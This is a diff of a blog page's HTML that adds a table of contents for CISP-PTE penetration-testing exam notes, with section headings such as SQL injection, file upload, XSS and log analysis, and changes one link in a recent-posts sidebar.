+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="nav-text">第一部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第一套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第二套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第三套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第四套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第五套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第六套题目</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="nav-text">第二部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-text">暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-text">xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-text">业务逻辑漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-text">日志分析</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -491,7 +505,7 @@
           <a href="/posts/59614.html" title="posts&#x2F;59614.html">CISP-PTE综合题做题笔记</a>
         </li>
         <li class="links-of-recent-posts-item">
-          <a href="/posts/19448.html" title="posts&#x2F;19448.html">cisp-pte基础题笔记</a>
+          <a href="/posts/0.html" title="posts&#x2F;0.html"></a>
         </li>
         <li class="links-of-recent-posts-item">
           <a href="/posts/13378.html" title="posts&#x2F;13378.html">cisp-pte客观题笔记</a>
